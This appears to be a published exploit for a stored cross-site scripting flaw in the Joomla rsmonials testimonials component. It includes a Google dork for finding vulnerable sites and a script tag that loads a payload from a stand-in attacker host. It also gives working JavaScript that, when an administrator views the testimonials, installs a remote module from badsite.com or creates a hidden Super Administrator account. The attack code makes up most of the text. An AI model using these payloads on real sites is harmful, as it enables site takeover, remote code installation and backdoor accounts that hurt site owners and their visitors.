Joomla Component rsmonials Remote Cross Site Scxripting Exploit
===============================================================


/*
RSMonials XSS Exploit

http://www.rswebsols.com/downloads/category/14-download-rsmonials-all?download=23%3Adownload-rsmonials-component

Google Dork: allinurl:option=com_rsmonials

Anything entered into the form gets rendered as HTML, so you can add tags
as long as they don&#039;t include quotes (magic quotes eats them, if it&#039;s on).
the administrator page for the testimonials renders your script in its entirety.

Proof of Concept 1: Remote file upload

Visit http://target.com/index.php?option=com_rsmonials and post a comment.
At the end of your glowing comment about how awesome the site is, attach this:

<script src=http://badsite.com/evil.js></script>

Now, when your admin goes to the com_rsmonials "Testimonials" page, your 
script will execute. In this example, a hidden iframe loads up the install
page and installs a &#039;custom&#039; module.

*/

var exploited = false;
var iframe = document.createElement( &#039;iframe&#039; );
var reg = new RegExp( &#039;administrator&#039; );
if( reg.test( location.href ) )
{
	iframe.src = &#039;index.php?option=com_installer&#039;;
	iframe.setStyle( &#039;display&#039;, &#039;none&#039; );
	document.body.appendChild( iframe );
	iframe.addEvent( &#039;load&#039;, exploit );
}
function exploit( e )
{
	if( exploited != true )
	{
		var doc = e.target.contentDocument; if( !doc ) return;
		var inp = doc.getElementById( &#039;install_url&#039; );
		inp.value = &#039;http://badsite.com/exploit.zip&#039;;
		var b = inp.parentNode.getElementsByTagName( &#039;input&#039; )[1];
		b.onclick();
		exploited = true;
	}
}

/*

Proof of Concept 2: New Super Administrator

Here&#039;s a drop-in replacement for the &#039;exploit&#039; function above:

function exploit( e )
{
	if( exploited != true )
	{
		var newForm = false;
		var doc = e.target.contentDocument; if( !doc ) return;
		var nb = doc.getElementsByTagName( &#039;a&#039; ); if( !nb ) return;
		var i = 0;
		for( ; i<nb.length; i++ )
		{
			if( nb[i].parentNode.id == &#039;toolbar-new&#039; )
			{
				nb[i].onclick();
			}
			else if( nb[i].parentNode.id == &#039;toolbar-save&#039; )
			{
				doc.getElementById( &#039;name&#039; ).value = &#039;hacked&#039;;
				doc.getElementById( &#039;username&#039; ).value = &#039;hacked&#039;;
				doc.getElementById( &#039;email&#039; ).value = &#039;your@freemail.com&#039;;
				doc.getElementById( &#039;password&#039; ).value = &#039;password&#039;;
				doc.getElementById( &#039;password2&#039; ).value = &#039;password&#039;;
				var g = doc.getElementById( &#039;gid&#039; );
				g.selectedIndex = g.options.length - 1;
				nb[i].onclick();
				exploited = true;
			}
		}
	}
}

If the admin is a Super Admin, then you could be too... just remember to watch
your freemail account for Joomla&#039;s account notification!

*/
/* jdc 2009 */




